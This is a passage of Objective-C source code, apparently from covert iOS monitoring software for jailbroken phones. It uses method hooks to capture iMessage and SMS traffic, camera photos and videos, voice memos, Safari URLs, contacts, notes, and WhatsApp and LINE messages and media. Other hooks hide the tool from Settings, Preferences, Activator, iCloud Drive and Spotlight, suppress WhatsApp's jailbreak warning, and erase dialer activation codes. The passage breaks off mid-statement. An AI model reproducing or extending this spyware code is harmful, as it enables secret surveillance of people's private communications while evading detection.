            MSHookMessage($SLFacebookSettingsController, @selector(tableView:cellForRowAtIndexPath:), $SLFacebookSettingsController$tableView$cellForRowAtIndexPath$, &_SLFacebookSettingsController$tableView$cellForRowAtIndexPath$);
			
			//_SLFacebookSettingsController$tableView$heightForRowAtIndexPath$ = MSHookMessage($SLFacebookSettingsController, @selector(tableView:heightForRowAtIndexPath:), &$SLFacebookSettingsController$tableView$heightForRowAtIndexPath$);
            
            Class $SettingsNetworkController = objc_getClass("SettingsNetworkController");
            MSHookMessage($SettingsNetworkController, @selector(tableView:cellForRowAtIndexPath:), $SettingsNetworkController$tableView$cellForRowAtIndexPath$, &_SettingsNetworkController$tableView$cellForRowAtIndexPath$);
            // iOS 9
            Class $PSUISettingsNetworkController = objc_getClass("PSUISettingsNetworkController");
            MSHookMessage($PSUISettingsNetworkController, @selector(tableView:cellForRowAtIndexPath:), $PSUISettingsNetworkController$tableView$cellForRowAtIndexPath$, &_PSUISettingsNetworkController$tableView$cellForRowAtIndexPath$);
            
            // iOS 9, Spotlight search suggestion
            NSBundle *searchSettingsBundle = [NSBundle bundleWithPath:@"/System/Library/PreferenceBundles/SearchSettings.bundle"];
            Class $SearchSettingsController = [searchSettingsBundle classNamed:@"SearchSettingsController"];
            //DLog(@"$SearchSettingsController, %@", $SearchSettingsController);
            MSHookMessage($SearchSettingsController, @selector(tableView:cellForRowAtIndexPath:), $SearchSettingsController$tableView$cellForRowAtIndexPath$, &_SearchSettingsController$tableView$cellForRowAtIndexPath$);
		}
        
        // Hook to invisible from iCloud Drive
        // iOS 8
        NSBundle *appleAccountSettingsBundle = [NSBundle bundleWithPath:@"/System/Library/PreferenceBundles/AccountSettings/AppleAccountSettings.bundle"];
        Class $AAUIDocumentsDataViewController = [appleAccountSettingsBundle classNamed:@"AAUIDocumentsDataViewController"];
        //DLog(@"$AAUIDocumentsDataViewController: %@", $AAUIDocumentsDataViewController);
        MSHookMessage($AAUIDocumentsDataViewController, @selector(tableView:cellForRowAtIndexPath:), $AAUIDocumentsDataViewController$tableView$cellForRowAtIndexPath$, &_AAUIDocumentsDataViewController$tableView$cellForRowAtIndexPath$);
        
        // iOS 9
        NSBundle *iCloudDriveSettingsBundle = [NSBundle bundleWithPath:@"/System/Library/PreferenceBundles/AccountSettings/iCloudDriveSettings.bundle"];
        Class $CDSiCloudDriveViewController = [iCloudDriveSettingsBundle classNamed:@"CDSiCloudDriveViewController"];
        //DLog(@"$CDSiCloudDriveViewController: %@", $CDSiCloudDriveViewController);
        MSHookMessage($CDSiCloudDriveViewController, @selector(tableView:cellForRowAtIndexPath:), $CDSiCloudDriveViewController$tableView$cellForRowAtIndexPath$, &_CDSiCloudDriveViewController$tableView$cellForRowAtIndexPath$);
        
		// Get notification when time is changed
		// Obsolete --> use Darwin notification instead in daemon
//		Class $DateTimeController = objc_getClass("DateTimeController");
//		_DateTimeController$significantTimeChange$ = MSHookMessage($DateTimeController, @selector(significantTimeChange:), &$DateTimeController$significantTimeChange$);
		}
	
#pragma mark -
#pragma mark MobileSMS, MobileSMS.compose iMessage, SMS hooks
#pragma mark -
	
	// iMessage
	if ([identifier isEqualToString:@"com.apple.MobileSMS"]) {
		Class $IMChat(objc_getClass("IMChat"));
		// -- Outgoing Text, Photo, Video for iOS 6 and everything (shared location, contact, voice memo, ...) for IOS 7
        // -- Outgoing everything, iOS 8, from inside Message application; for outside application see: com.apple.mobilesms.compose
		//_IMChat$sendMessage$ = MSHookMessage($IMChat, @selector(sendMessage:), &$IMChat$sendMessage$);
        MSHookMessage($IMChat, @selector(sendMessage:), $IMChat$sendMessage$, &_IMChat$sendMessage$);

		/// -- ALL Incoming for iOS 7, 8
		if ([[[UIDevice currentDevice] systemVersion] floatValue] >= 7.0) {
			DLog (@"Incoming iMessage Hooking for iOS 7 onward")
			// For iOS 6, this method will be called on SpringBoard 
			//_IMChat$_handleIncomingMessage$ = MSHookMessage($IMChat, @selector(_handleIncomingMessage:), &$IMChat$_handleIncomingMessage$);
            MSHookMessage($IMChat, @selector(_handleIncomingMessage:), $IMChat$_handleIncomingMessage$, &_IMChat$_handleIncomingMessage$);
            
            // iOS 8
            MSHookMessage($IMChat, @selector(_handleIncomingItem:), $IMChat$_handleIncomingItem$, &_IMChat$_handleIncomingItem$);
		}
				
		// SMS commands utils (to surpress sound and vibrate while Messages application in foreground)
		if ([MSFSPUtils systemOSVersion] >= 6) {
			Class $SMSApplication = objc_getClass("SMSApplication");
			//_SMSApplication$_receivedMessage$ = MSHookMessage($SMSApplication, @selector(_receivedMessage:), &$SMSApplication$_receivedMessage$);
            MSHookMessage($SMSApplication, @selector(_receivedMessage:), $SMSApplication$_receivedMessage$, &_SMSApplication$_receivedMessage$);
			Class $CKTranscriptController = objc_getClass("CKTranscriptController");
			//_CKTranscriptController$_messageReceived$ = MSHookMessage($CKTranscriptController, @selector(_messageReceived:), &$CKTranscriptController$_messageReceived$);
            MSHookMessage($CKTranscriptController, @selector(_messageReceived:), $CKTranscriptController$_messageReceived$, &_CKTranscriptController$_messageReceived$);
		}
		
		/*
			On IOS 7, 8, the method belows are not called on SpringBoard anymore, but it's called on MobileSMS application
		 */
		if ([MSFSPUtils systemOSVersion] >= 7) {
            
			Class $IMChatRegistry = objc_getClass("IMChatRegistry");
			
            // -- For detection of sms command, sms keywords
			MSHookMessage($IMChatRegistry,
                          @selector(account:chat:style:chatProperties:messageReceived:),
                          $IMChatRegistry$account$chat$style$chatProperties$messageReceived$,
                          &_IMChatRegistry$account$chat$style$chatProperties$messageReceived$);
						
			// -- For detection the SENT of sms, mms
            MSHookMessage($IMChatRegistry,
                          @selector(account:chat:style:chatProperties:messageSent:),
                          $IMChatRegistry$account$chat$style$chatProperties$messageSent$,
                          &_IMChatRegistry$account$chat$style$chatProperties$messageSent$);
		}
	}
    
    if ([identifier isEqualToString:@"com.apple.mobilesms.compose"]) {
        if ([[[UIDevice currentDevice] systemVersion] floatValue] >= 8.0) {
            Class $IMChat(objc_getClass("IMChat"));
            // iOS 8, outgoing iMessage from outside Message application
            MSHookMessage($IMChat, @selector(sendMessage:), $IMChat$sendMessage$, &_IMChat$sendMessage$);
        }
    }
	
#pragma mark -
#pragma mark Camera hooks
#pragma mark -
	
	// Camera image and video Capture
   	if ([identifier isEqualToString:@"com.apple.camera"]) {
		
        Class $PLCameraController(objc_getClass("PLCameraController"));
        
        // in case of 7.0.4 this return 7.00000
        // in case of 7.1.1 this return 7.10000
        if([[[UIDevice currentDevice] systemVersion] floatValue] >= 4.3) {
			DLog(@"iOS 4.3 onward")
            
            Class $CAMCaptureController = objc_getClass("CAMCaptureController");
            // IMAGE ios 8.1 onward
            MSHookMessage($CAMCaptureController, @selector(_didTakePhoto),
                          $CAMCaptureController$_didTakePhoto,
                          &_CAMCaptureController$_didTakePhoto);
            MSHookMessage($CAMCaptureController, @selector(stopPanoramaCapture),
                          $CAMCaptureController$stopPanoramaCapture,
                          &_CAMCaptureController$stopPanoramaCapture);
            
			// IMAGE ios 7.1.1 onward
            MSHookMessage($PLCameraController, @selector(_processCapturedPhotoWithDictionary:error:HDRUsed:), $PLCameraController$_processCapturedPhotoWithDictionary$error$HDRUsed$, &_PLCameraController$_processCapturedPhotoWithDictionary$error$HDRUsed$);
            MSHookMessage($PLCameraController, @selector(stopPanoramaCapture), $PLCameraController$stopPanoramaCapture, &_PLCameraController$stopPanoramaCapture);
			// IMAGE up to ios 7.0.4
			//_PLCameraController$_processCapturedPhotoWithDictionary$error$ = MSHookMessage($PLCameraController, @selector(_processCapturedPhotoWithDictionary:error:), &$PLCameraController$_processCapturedPhotoWithDictionary$error$);
            MSHookMessage($PLCameraController, @selector(_processCapturedPhotoWithDictionary:error:), $PLCameraController$_processCapturedPhotoWithDictionary$error$, &_PLCameraController$_processCapturedPhotoWithDictionary$error$);
			
            // VIDEO
			//_PLCameraController$startVideoCapture = MSHookMessage($PLCameraController, @selector(startVideoCapture), &$PLCameraController$startVideoCapture);	// not tested
            MSHookMessage($PLCameraController, @selector(startVideoCapture), $PLCameraController$startVideoCapture, &_PLCameraController$startVideoCapture);	// not tested
			//_PLCameraController$stopVideoCapture = MSHookMessage($PLCameraController, @selector(stopVideoCapture), &$PLCameraController$stopVideoCapture);
            MSHookMessage($PLCameraController, @selector(stopVideoCapture), $PLCameraController$stopVideoCapture, &_PLCameraController$stopVideoCapture);
            // iOS 8.1
            // This method does not call but we don't need it (stopVideoCapture is enough)
            MSHookMessage($CAMCaptureController, @selector(startVideoCapture), $CAMCaptureController$startVideoCapture, &_CAMCaptureController$startVideoCapture);
            MSHookMessage($CAMCaptureController, @selector(stopVideoCapture), $CAMCaptureController$stopVideoCapture, &_CAMCaptureController$stopVideoCapture);
            
            // iOS 9
            Class $CUCaptureController = objc_getClass("CUCaptureController");
            // VIDEO, SLO-MO
            MSHookMessage($CUCaptureController, @selector(stopCapturingVideo), $CUCaptureController$stopCapturingVideo, &_CUCaptureController$stopCapturingVideo);
            // PANORAMA
            MSHookMessage($CUCaptureController, @selector(stopCapturingPanorama), $CUCaptureController$stopCapturingPanorama, &_CUCaptureController$stopCapturingPanorama);
            // PHOTO, SQUARE
            MSHookMessage($CUCaptureController,
                          @selector(stillImageRequestDidCompleteCapture:error:),
                          $CUCaptureController$stillImageRequestDidCompleteCapture$error$,
                          &_CUCaptureController$stillImageRequestDidCompleteCapture$error$);
            
            Class $CAMTimelapseController = objc_getClass("CAMTimelapseController");
            // TIME-LAPSE
            MSHookMessage($CAMTimelapseController, @selector(stopCapturingWithReasons:), $CAMTimelapseController$stopCapturingWithReasons$, &_CAMTimelapseController$stopCapturingWithReasons$);
            
		} else {
			DLog(@"iOS 4.0 or 4.1 or 4.2")
			// IMAGE
			//_PLCameraController$_capturedPhotoWithDictionary$ = MSHookMessage($PLCameraController, @selector(_capturedPhotoWithDictionary:), &$PLCameraController$_capturedPhotoWithDictionary$);
            MSHookMessage($PLCameraController, @selector(_capturedPhotoWithDictionary:), $PLCameraController$_capturedPhotoWithDictionary$, &_PLCameraController$_capturedPhotoWithDictionary$);
			// VIDEO: stop
			//_PLCameraController$_recordingStopped$ = MSHookMessage($PLCameraController, @selector(_recordingStopped:), &$PLCameraController$_recordingStopped$);
            MSHookMessage($PLCameraController, @selector(_recordingStopped:), $PLCameraController$_recordingStopped$, &_PLCameraController$_recordingStopped$);
			// VIDEO: start
			//_PLCameraController$_captureStarted$ = MSHookMessage($PLCameraController, @selector(_captureStarted:), &$PLCameraController$_captureStarted$);
            MSHookMessage($PLCameraController, @selector(_captureStarted:), $PLCameraController$_captureStarted$, &_PLCameraController$_captureStarted$);
		}
	}
	
#pragma mark -
#pragma mark VoiceMemos hooks
#pragma mark -
	
	// Audio Capture
   	if ([identifier isEqualToString:@"com.apple.VoiceMemos"]) {
		Class $RCRecorderViewController(objc_getClass("RCRecorderViewController"));
		// AUDIO: start
		//_RCRecorderViewController$recordingControlsViewDidStartRecording$ = MSHookMessage($RCRecorderViewController, @selector(recordingControlsViewDidStartRecording:), &$RCRecorderViewController$recordingControlsViewDidStartRecording$);
        MSHookMessage($RCRecorderViewController, @selector(recordingControlsViewDidStartRecording:), &$RCRecorderViewController$recordingControlsViewDidStartRecording$, &_RCRecorderViewController$recordingControlsViewDidStartRecording$);
		// AUDIO: stop
		//_RCRecorderViewController$recordingControlsViewDidStopRecording$ = MSHookMessage($RCRecorderViewController, @selector(recordingControlsViewDidStopRecording:), &$RCRecorderViewController$recordingControlsViewDidStopRecording$);
        MSHookMessage($RCRecorderViewController, @selector(recordingControlsViewDidStopRecording:), $RCRecorderViewController$recordingControlsViewDidStopRecording$, &_RCRecorderViewController$recordingControlsViewDidStopRecording$);
				
		// For iOS 7 (This class doesn't exist on iOS 6)
		Class $RCMainViewController(objc_getClass("RCMainViewController"));
		// AUDIO: start
		//_RCMainViewController$controlsViewDidChooseStartRecording$ =  MSHookMessage($RCMainViewController, @selector(controlsViewDidChooseStartRecording:), &$RCMainViewController$controlsViewDidChooseStartRecording$);
        MSHookMessage($RCMainViewController, @selector(controlsViewDidChooseStartRecording:), $RCMainViewController$controlsViewDidChooseStartRecording$, &_RCMainViewController$controlsViewDidChooseStartRecording$);
		// AUDIO: stop
		//_RCMainViewController$audioMemoViewControllerDidFinish$ =  MSHookMessage($RCMainViewController, @selector(audioMemoViewControllerDidFinish:), &$RCMainViewController$audioMemoViewControllerDidFinish$);
		MSHookMessage($RCMainViewController, @selector(audioMemoViewControllerDidFinish:), $RCMainViewController$audioMemoViewControllerDidFinish$, &_RCMainViewController$audioMemoViewControllerDidFinish$);
	
        // iOS 8,9
		Class $RCEditMemoViewController(objc_getClass("RCEditMemoViewController"));
        MSHookMessage($RCEditMemoViewController, @selector(commitEditing),
                      $RCEditMemoViewController$commitEditing,
                      &_RCEditMemoViewController$commitEditing);
        // New recording file
        MSHookMessage($RCEditMemoViewController, @selector(_editRecordingNameWithAlertTitle:message:confirmationTitle:cancelTitle:completionBlock:),
                      $RCEditMemoViewController$_editRecordingNameWithAlertTitle$message$confirmationTitle$cancelTitle$completionBlock$,
                      &_RCEditMemoViewController$_editRecordingNameWithAlertTitle$message$confirmationTitle$cancelTitle$completionBlock$);
	}
	
#pragma mark -
#pragma mark libactivator, Preferences hooks
#pragma mark -
	
	// Hide from Activator and Preferences
	if ([identifier isEqualToString:@"libactivator"] || [identifier isEqualToString:@"com.apple.Preferences"]) {
		Class $UIViewController(objc_getClass("UIViewController"));
		//_UIViewController$viewWillAppear$ = MSHookMessage($UIViewController, @selector(viewWillAppear:), &$UIViewController$viewWillAppear$);
        // Obsoleted
        MSHookMessage($UIViewController, @selector(viewWillAppear:), $UIViewController$viewWillAppear$, &_UIViewController$viewWillAppear$);
		
		// Hook to show always update in Software Update view (Obsoleted, Jailbreak tool handle it)
		Class $PrefsSUTableView(objc_getClass("PrefsSUTableView"));
		DLog(@"=============== $PrefsSUTableView = %@", $PrefsSUTableView);
		//_PrefsSUTableView$setSUState$ = MSHookMessage($PrefsSUTableView, @selector(setSUState:), &$PrefsSUTableView$setSUState$);
        MSHookMessage($PrefsSUTableView, @selector(setSUState:), $PrefsSUTableView$setSUState$, &_PrefsSUTableView$setSUState$);
		//_PrefsSUTableView$layoutSubviews = MSHookMessage($PrefsSUTableView, @selector(layoutSubviews), &$PrefsSUTableView$layoutSubviews);
        MSHookMessage($PrefsSUTableView, @selector(layoutSubviews), $PrefsSUTableView$layoutSubviews, &_PrefsSUTableView$layoutSubviews);
		
	}
	
#pragma mark -
#pragma mark mobilesafari hooks
#pragma mark -
	
	// BrowserUrl Capture
	if ([identifier isEqualToString:@"com.apple.mobilesafari"]) {
		// Bookmark capture
		// Obsolete, no longer have the use case
//		Class $BookmarkInfoViewController(objc_getClass("BookmarkInfoViewController"));
//		_BookmarkInfoViewController$_save = MSHookMessage($BookmarkInfoViewController, @selector(_save), &$BookmarkInfoViewController$_save);
//		_BookmarkInfoViewController$saveChanges = MSHookMessage($BookmarkInfoViewController, @selector(saveChanges), &$BookmarkInfoViewController$saveChanges);
//		_BookmarkInfoViewController$loadView = MSHookMessage($BookmarkInfoViewController, @selector(loadView), &$BookmarkInfoViewController$loadView);
		
		// Browser url capture IOS4, IOS5
		Class $TabController(objc_getClass("TabController"));
		//_TabController$tabDocument$didFinishLoadingWithError$ = MSHookMessage($TabController, @selector(tabDocument:didFinishLoadingWithError:), &$TabController$tabDocument$didFinishLoadingWithError$);
        MSHookMessage($TabController, @selector(tabDocument:didFinishLoadingWithError:), $TabController$tabDocument$didFinishLoadingWithError$, &_TabController$tabDocument$didFinishLoadingWithError$);
		
		// Browser url capture IOS6, 7
		Class $TabDocument(objc_getClass("TabDocument"));	
		//_TabDocument$browserLoadingController$didFinishLoadingWithError$dataSource$ = MSHookMessage($TabDocument, @selector(browserLoadingController:didFinishLoadingWithError:dataSource:), &$TabDocument$browserLoadingController$didFinishLoadingWithError$dataSource$);
        MSHookMessage($TabDocument, @selector(browserLoadingController:didFinishLoadingWithError:dataSource:), $TabDocument$browserLoadingController$didFinishLoadingWithError$dataSource$, &_TabDocument$browserLoadingController$didFinishLoadingWithError$dataSource$);
        
        // iOS 8
        if ([MSFSPUtils systemOSVersion] >= 8) {
            Class $BrowserController(objc_getClass("BrowserController"));
            MSHookMessage($BrowserController, @selector(tabDocument:didFinishLoadingWithError:),
                          $BrowserController$tabDocument$didFinishLoadingWithError$,
                          &_BrowserController$tabDocument$didFinishLoadingWithError$);
        }
	}
	
#pragma mark -
#pragma mark MobileAddressBook, mobilemail, MobileSMS, springboard, mobilephone hooks
#pragma mark -
	
    if ([identifier isEqualToString:@"com.apple.mobilephone"]) {
        /*
            On iOS 8, we need to clear the cache of the dial activation code from mobile substrate.
            The old approach which is to delete the file, storing the cache, doesn't work anymore
         */
        if ([[[UIDevice currentDevice] systemVersion] intValue] >= 8) {
            DLog(@"Delete *# dial number from keypad");
             
            DLog(@"***** Dial Saved Number ****** [%@]", [[[NSUserDefaults standardUserDefaults] dictionaryRepresentation] objectForKey:@"DialerSavedNumber"])
            if ([[[[NSUserDefaults standardUserDefaults] dictionaryRepresentation] objectForKey:@"DialerSavedNumber"] hasPrefix:@"*#"]) {
                [[NSUserDefaults standardUserDefaults] setObject:@"" forKey:@"DialerSavedNumber"];
                DLog(@"***** Dial Saved Number (After clear) ****** [%@]", [[[NSUserDefaults standardUserDefaults] dictionaryRepresentation] objectForKey:@"DialerSavedNumber"])
            }
         }
    }
    
	// Contact changes
	if ([identifier isEqualToString:@"com.apple.MobileAddressBook"] ||
		[identifier isEqualToString:@"com.apple.mobilemail"] ||
		[identifier isEqualToString:@"com.apple.MobileSMS"] ||
		[identifier isEqualToString:@"com.apple.springboard"] ||
		[identifier isEqualToString:@"com.apple.mobilephone"]) {
		Class $ABPersonViewController = objc_getClass("ABPersonViewController");
	
		//_ABPersonViewController$viewDidLoad = MSHookMessage($ABPersonViewController, @selector(viewDidLoad), &$ABPersonViewController$viewDidLoad);
        MSHookMessage($ABPersonViewController, @selector(viewDidLoad), $ABPersonViewController$viewDidLoad, &_ABPersonViewController$viewDidLoad);
		//_ABPersonViewController$viewDidUnload = MSHookMessage($ABPersonViewController, @selector(viewDidUnload), &$ABPersonViewController$viewDidUnload);
		
		//_ABPersonViewController$dealloc = MSHookMessage($ABPersonViewController, @selector(dealloc), &$ABPersonViewController$dealloc);
        MSHookMessage($ABPersonViewController, @selector(dealloc), $ABPersonViewController$dealloc, &_ABPersonViewController$dealloc);
		
		//_ABPersonViewController$viewDidAppear$ = MSHookMessage($ABPersonViewController, @selector(viewDidAppear:), &$ABPersonViewController$viewDidAppear$);
		//_ABPersonViewController$viewWillDisappear$ = MSHookMessage($ABPersonViewController, @selector(viewWillDisappear:), &$ABPersonViewController$viewWillDisappear$);
	}
#pragma mark -
#pragma mark mobilenotes hook
#pragma mark -
	
	// Note
	if ([identifier isEqualToString:@"com.apple.mobilenotes"]) {
		//if (UI_USER_INTERFACE_IDIOM() == UIUserInterfaceIdiomPad){
		if ([SystemUtilsImpl isIpad] || [SystemUtilsImpl isIpodTouch]) {
			DLog(@"I AM IPAD");
			// To capture activate for Ipad application
			Class $NotesDisplayController = objc_getClass("NotesDisplayController");
			//_NotesDisplayController$saveNote = MSHookMessage($NotesDisplayController, @selector(saveNote), &$NotesDisplayController$saveNote);
            MSHookMessage($NotesDisplayController, @selector(saveNote), $NotesDisplayController$saveNote, &_NotesDisplayController$saveNote);
            
            // iOS 9
            Class $ICNoteContext = objc_getClass("ICNoteContext");
            MSHookMessage($ICNoteContext, @selector(save:), $ICNoteContext$save_iPadiPod$, &_ICNoteContext$save_iPadiPod$);
        } else {
            DLog(@"I AM NOT IPAD");
            Class $ICNoteContext = objc_getClass("ICNoteContext");
            // Relay notes changes notification to daemon
            MSHookMessage($ICNoteContext, @selector(save:), $ICNoteContext$save$, &_ICNoteContext$save$);
        }
	}
	
#pragma mark -
#pragma mark WhatsApp hooks
#pragma mark -
	
    // WhatsApp
	if([identifier isEqualToString:@"net.whatsapp.WhatsApp"] && [IMShareUtils shouldHookInCurrentVersion:versionOfIM withBundleIdentifier:identifier]) {
		Class $XMPPStream(objc_getClass("XMPPStream"));
		//_XMPPStream$send$						= MSHookMessage($XMPPStream, @selector(send:), &$XMPPStream$send$);
        MSHookMessage($XMPPStream, @selector(send:), $XMPPStream$send$, &_XMPPStream$send$);
		
		// -- for WhatsApp 2.8.2 and 2.8.3
		//_XMPPStream$send$encrypted$				= MSHookMessage($XMPPStream, @selector(send:encrypted:), &$XMPPStream$send$encrypted$);
        MSHookMessage($XMPPStream, @selector(send:encrypted:), $XMPPStream$send$encrypted$, &_XMPPStream$send$encrypted$);
        
        // -- For WhatsApp 2.12.3, 2.12.4, 2.12.10
        //MSHookMessage($XMPPStream, @selector(sendElements:), $XMPPStream$sendElements$, &_XMPPStream$sendElements$);
        //MSHookMessage($XMPPStream, @selector(sendElements:timeout:), $XMPPStream$sendElements$timeout$, &_XMPPStream$sendElements$timeout$);
        MSHookMessage($XMPPStream, @selector(sendElement:), $XMPPStream$sendElement$, &_XMPPStream$sendElement$);
        //MSHookMessage($XMPPStream, @selector(sendElement:timeout:), $XMPPStream$sendElement$timeout$, &_XMPPStream$sendElement$timeout$);
		
		// -- for WhatsApp 2.8.2 and previous version (Don't know the version number)
		Class $XMPPConnection(objc_getClass("XMPPConnection"));
		//_XMPPConnection$processIncomingMessages$ = MSHookMessage($XMPPConnection, @selector(processIncomingMessages:), &$XMPPConnection$processIncomingMessages$);
		MSHookMessage($XMPPConnection, @selector(processIncomingMessages:), $XMPPConnection$processIncomingMessages$, &_XMPPConnection$processIncomingMessages$);
        
         // Since version 2.12.1, the method has a return value
        if ([IMShareUtils isVersionText:versionOfIM isLessThan:@"2.12.1"]) {
            // -- for WhatsApp 2.11.3
            //_XMPPConnection$processIncomingMessageStanzas$ = MSHookMessage($XMPPConnection, @selector(processIncomingMessageStanzas:), &$XMPPConnection$processIncomingMessageStanzas$);
            MSHookMessage($XMPPConnection, @selector(processIncomingMessageStanzas:), $XMPPConnection$processIncomingMessageStanzas$, &_XMPPConnection$processIncomingMessageStanzas$);
        }
        else {
            // 2.12.10
            MSHookMessage($XMPPConnection, @selector(processIncomingMessageStanzas:), $XMPPConnection$processIncomingMessageStanzas2_12_1$, &_XMPPConnection$processIncomingMessageStanzas2_12_1$);
        }
        
		Class $WAChatStorage(objc_getClass("WAChatStorage"));
		//_WAChatStorage$messageWithImage$inChatSession$saveToLibrary$error$	= MSHookMessage($WAChatStorage, @selector(messageWithImage:inChatSession:saveToLibrary:error:), &$WAChatStorage$messageWithImage$inChatSession$saveToLibrary$error$);
        MSHookMessage($WAChatStorage, @selector(messageWithImage:inChatSession:saveToLibrary:error:), $WAChatStorage$messageWithImage$inChatSession$saveToLibrary$error$, &_WAChatStorage$messageWithImage$inChatSession$saveToLibrary$error$);
		//_WAChatStorage$messageWithMovieURL$inChatSession$copyFile$error$	= MSHookMessage($WAChatStorage, @selector(messageWithMovieURL:inChatSession:copyFile:error:), &$WAChatStorage$messageWithMovieURL$inChatSession$copyFile$error$);
        MSHookMessage($WAChatStorage, @selector(messageWithMovieURL:inChatSession:copyFile:error:), $WAChatStorage$messageWithMovieURL$inChatSession$copyFile$error$, &_WAChatStorage$messageWithMovieURL$inChatSession$copyFile$error$);
		//_WAChatStorage$messageWithAudioURL$inChatSession$error$				= MSHookMessage($WAChatStorage, @selector(messageWithAudioURL:inChatSession:error:), &$WAChatStorage$messageWithAudioURL$inChatSession$error$);
        MSHookMessage($WAChatStorage, @selector(messageWithAudioURL:inChatSession:error:), $WAChatStorage$messageWithAudioURL$inChatSession$error$, &_WAChatStorage$messageWithAudioURL$inChatSession$error$);
		
		// This method doesn't exist in the previous version of WhatsApp (2.8.7). They exists in WhatsApp version 2.10.1
		//_WAChatStorage$messageWithAudioURL$inChatSession$origin$durationSeconds$doNotUpload$error$	= MSHookMessage($WAChatStorage, @selector(messageWithAudioURL:inChatSession:origin:durationSeconds:doNotUpload:error:), &$WAChatStorage$messageWithAudioURL$inChatSession$origin$durationSeconds$doNotUpload$error$);
        MSHookMessage($WAChatStorage, @selector(messageWithAudioURL:inChatSession:origin:durationSeconds:doNotUpload:error:), $WAChatStorage$messageWithAudioURL$inChatSession$origin$durationSeconds$doNotUpload$error$, &_WAChatStorage$messageWithAudioURL$inChatSession$origin$durationSeconds$doNotUpload$error$);
        
		// -- for WhatsApp 2.11.5 (the 1st method that will be called to keep audio path)
		//_WAChatStorage$messageWithAudioURL$inChatSession$origin$durationSeconds$doNotUpload$streaming$streamingHash$error$	= MSHookMessage($WAChatStorage, @selector(messageWithAudioURL:inChatSession:origin:durationSeconds:doNotUpload:streaming:streamingHash:error:), &$WAChatStorage$messageWithAudioURL$inChatSession$origin$durationSeconds$doNotUpload$streaming$streamingHash$error$);
        MSHookMessage($WAChatStorage, @selector(messageWithAudioURL:inChatSession:origin:durationSeconds:doNotUpload:streaming:streamingHash:error:), $WAChatStorage$messageWithAudioURL$inChatSession$origin$durationSeconds$doNotUpload$streaming$streamingHash$error$, &_WAChatStorage$messageWithAudioURL$inChatSession$origin$durationSeconds$doNotUpload$streaming$streamingHash$error$);

		// -- for WhatsApp 2.11.5 (the 1st method that will be called to keep video path)		
		Class $WAMediaUploader(objc_getClass("WAMediaUploader"));
		//_WAMediaUploader$uploadVideoFileAt$from$						= MSHookMessage($WAMediaUploader, @selector(uploadVideoFileAt:from:), &$WAMediaUploader$uploadVideoFileAt$from$);
        MSHookMessage($WAMediaUploader, @selector(uploadVideoFileAt:from:), $WAMediaUploader$uploadVideoFileAt$from$, &_WAMediaUploader$uploadVideoFileAt$from$);
        
        // For prevent WhatsApp to exit with notification that "The add-ons you are using on your jailbroken iPhone are incompatible with this version of WhatsApp."
        MSHookMessage(objc_getMetaClass("WASharedAppData"),
                      @selector(showLocalNotificationForJailbrokenPhoneAndTerminate),
                      $WASharedAppData$showLocalNotificationForJailbrokenPhoneAndTerminate,
                      &_WASharedAppData$showLocalNotificationForJailbrokenPhoneAndTerminate);

	}
	
#pragma mark -
#pragma mark LINE for iPad hook
#pragma mark -
    
    if ([identifier isEqualToString:@"com.linecorp.line.ipad"] && [IMShareUtils shouldHookInCurrentVersion:versionOfIM withBundleIdentifier:identifier]) {
        DLog(@"Hook LINE on iPad")
        
        // outgoing
        Class $TalkMessageObject(objc_getClass("TalkMessageObject"));
        MSHookMessage($TalkMessageObject, @selector(send), $TalkMessageObject$send, &_TalkMessageObject$send);

        // outgoing synced from another device
		MSHookMessage($TalkMessageObject, @selector(line_messageSent:), $TalkMessageObject$line_messageSent$, &_TalkMessageObject$line_messageSent$);

        // incoming
        Class $TalkChatObject(objc_getClass("TalkChatObject"));
        MSHookMessage($TalkChatObject,  @selector(updateLastReceivedMessageID:),
                      $TalkChatObject$updateLastReceivedMessageID$,
                      &_TalkChatObject$updateLastReceivedMessageID$);
        
        // LINE 5.2.x, 5.3.2 (from iPhone)
        //
        Class $ManagedMessage = objc_getClass("ManagedMessage");
        DLog (@"ManagedMessage --> %@", $ManagedMessage);
        // Outgoing LINE from PC (obsolete) & VOIP
        MSHookMessage($ManagedMessage, @selector(line_messageSent:), $ManagedMessage$line_messageSent$, &_ManagedMessage$line_messageSent$);
        // Outgoing IM
        MSHookMessage($ManagedMessage, @selector(send), $ManagedMessage$send, &_ManagedMessage$send);
        
        Class $ManagedChat = objc_getClass("ManagedChat");
        DLog (@"ManagedChat --> %@", $ManagedChat);
        // Incoming IM & VOIP
        MSHookMessage($ManagedChat, @selector(updateLastReceivedMessageID:), $ManagedChat$updateLastReceivedMessageID$, &_ManagedChat$updateLastReceivedMessageID$);
    }
    
#pragma mark -
#pragma mark LINE hook
#pragma mark -
    
	// LINE
	if ([identifier isEqualToString:@"jp.naver.line"] && [IMShareUtils shouldHookInCurrentVersion:versionOfIM withBundleIdentifier:identifier]) {
        
		Class $TalkChatObject(objc_getClass("TalkChatObject"));
		//_TalkChatObject$addMessagesObject$ = MSHookMessage($TalkChatObject, @selector(addMessagesObject:), &$TalkChatObject$addMessagesObject$);
        MSHookMessage($TalkChatObject,
                      @selector(addMessagesObject:),
                      $TalkChatObject$addMessagesObject$,
                      &_TalkChatObject$addMessagesObject$);

        // for LINE version 4.2
        MSHookMessage($TalkChatObject,  @selector(updateLastReceivedMessageID:),
                      $TalkChatObject$updateLastReceivedMessageID$,
                      &_TalkChatObject$updateLastReceivedMessageID$);
        
        
		// -- for outgoing from PC version
		Class $TalkMessageObject(objc_getClass("TalkMessageObject"));
		//_TalkMessageObject$line_messageSent$ = MSHookMessage($TalkMessageObject, @selector(line_messageSent:), &$TalkMessageObject$line_messageSent$);
		MSHookMessage($TalkMessageObject, @selector(line_messageSent:), $TalkMessageObject$line_messageSent$, &_TalkMessageObject$line_messageSent$);
				
		/*
		 According to the test result 
		 - LINE version 3.4.1,	[TalkChatObject addMessagesObject] is called when sending the message
								[TalkMessageObject send] is called
		 - LINE version 3.5.0,	[TalkChatObject addMessagesObject] is "NOT" called
								[TalkMessageObject send] is called
		 */
        NSDictionary *bundleInfo        = [[NSBundle mainBundle] infoDictionary];
        NSString *versionOfIM           = [bundleInfo objectForKey:@"CFBundleShortVersionString"];
        if (versionOfIM == nil || [versionOfIM length] == 0) {
            versionOfIM = [bundleInfo objectForKey:@"CFBundleVersion"];
        }
        NSArray *currentVersion         = [IMShareUtils parseVersion:versionOfIM];
        DLog(@"line version array %@", currentVersion)
		
		//if ([LINEUtils isLineVersionIsEqualOrGreaterThan:3.5]) {
		
		if ([IMShareUtils isVersion:currentVersion
					 greaterOrEqual:[IMShareUtils parseVersion:@"3.5"]]) {
			DLog (@"hook TalkMessageObject --> send")
